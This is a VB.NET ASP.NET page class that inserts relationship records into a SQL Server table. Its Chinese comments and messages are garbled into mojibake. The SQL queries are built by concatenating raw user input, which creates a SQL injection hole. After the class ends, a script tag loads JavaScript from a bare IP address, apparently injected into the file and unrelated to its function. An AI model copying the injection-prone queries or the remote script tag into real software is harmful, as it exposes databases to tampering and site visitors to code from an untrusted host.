Imports System.Data
Imports System.Data.SqlClient

Public Class _to
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents Label7 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents txtAssKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtRefKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtFromType As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtToType As System.Web.UI.WebControls.TextBox
    Protected WithEvents rbtnIsDirYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents btnAddAss As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents ddlstFrom As System.Web.UI.WebControls.DropDownList
    Protected WithEvents ddlstTo As System.Web.UI.WebControls.DropDownList
    Protected WithEvents timetext As System.Web.UI.WebControls.Label
    Protected WithEvents txtAssKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()
        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If
        If Not IsPostBack Then
            Me.rbtnIsDirYes.Checked = True
            Me.rbtnIsDirYes.Checked = True
            Me.txtRefKey.Text = Me.Session("DefKey")
            Me.txtRefKey.Enabled = False

            Dim i As Integer
            Dim ss As String = "abcdefghijklmnopqrstuvwxyz"
            For i = 0 To Me.Session("DefNum") - 1
                Me.ddlstFrom.Items.Add(ss.Substring(i, 1))
                Me.ddlstTo.Items.Add(ss.Substring(i, 1))
            Next
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.lblWarning.Visible = False
        Me.txtAssKey.Text = ""
        Me.ddlstFrom.SelectedIndex = 0
        Me.txtFromType.Text = ""
        Me.ddlstTo.SelectedIndex = 0
        Me.txtToType.Text = ""
        Me.rbtnIsDirNo.Checked = False
        Me.rbtnIsDirYes.Checked = True
    End Sub

    Private Sub btnAddAss_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAddAss.Click
        If (Me.txtAssKey.Text.Trim() = ""  Or Me.txtFromType.Text.Trim() = "" _
            Or Me.txtRefKey.Text.Trim() = "" Or Me.txtToType.Text.Trim() = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        If (Me.ddlstFrom.SelectedItem.Text = Me.ddlstTo.SelectedItem.Text) Then
            Me.lblWarning.Text = "���ѣ���ϵ������ʼ����յ㲻����ͬ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from publisherassertion where assertionkey='" + Me.txtAssKey.Text.Trim() + "' or (vfrom='" + _
            Me.ddlstFrom.SelectedItem.Text.Trim() + "' and vto='" + Me.ddlstTo.SelectedItem.Text.Trim() + "' and rdefinitionkey='" + _
            Me.Session("DefKey") + "')"
        ' �鿴assertionkey�Ƿ��ѷ���
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "���棺��Ӳ��ɹ����ù�ϵ���Ա���Ѵ��ڻ���ѡ���е��������������Ѿ����"
                lblWarning.Visible = True
            Else
                ' ��ȡ�Ƿ����򱣴���chrIsDir��
                Dim chrAccPri As Char
                Dim chrIsValid As Char
                Dim chrNeedAff As Char
                Dim chrIsDir As Char

                If Me.rbtnIsDirYes.Checked = True Then
                    chrIsDir = "1"
                Else
                    chrIsDir = "0"
                End If

                ' ����������
                strSql = "Insert into publisherassertion values('" + Me.txtAssKey.Text.Trim() + "','" + _
                    Me.txtRefKey.Text.Trim() + "','" + Me.ddlstFrom.SelectedItem.Text.Trim() + "','" + _
                    Me.ddlstTo.SelectedItem.Text.Trim() + "','" + Me.txtFromType.Text.Trim() + "','" + _
                    Me.txtToType.Text.Trim() + "','" + chrIsDir + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "��ϲ����ӹ�ϵ���Գɹ������������һ��" + Me.txtAssKey.Text.Trim() + "�ɹ�"
                    Me.lblWarning.Visible = True
                    Me.txtAssKey.Text = ""
                    Me.ddlstFrom.SelectedIndex = 0
                    Me.txtFromType.Text = ""
                    Me.ddlstTo.SelectedIndex = 0
                    Me.txtToType.Text = ""
                    Me.rbtnIsDirNo.Checked = False
                    Me.rbtnIsDirYes.Checked = True
                Else
                    Me.lblWarning.Text = "���棺����ĳ��ԭ����ӹ�ϵ����ʧ�ܣ�������û��Ȩ��"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        Me.Response.Redirect("addlogic.aspx")
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
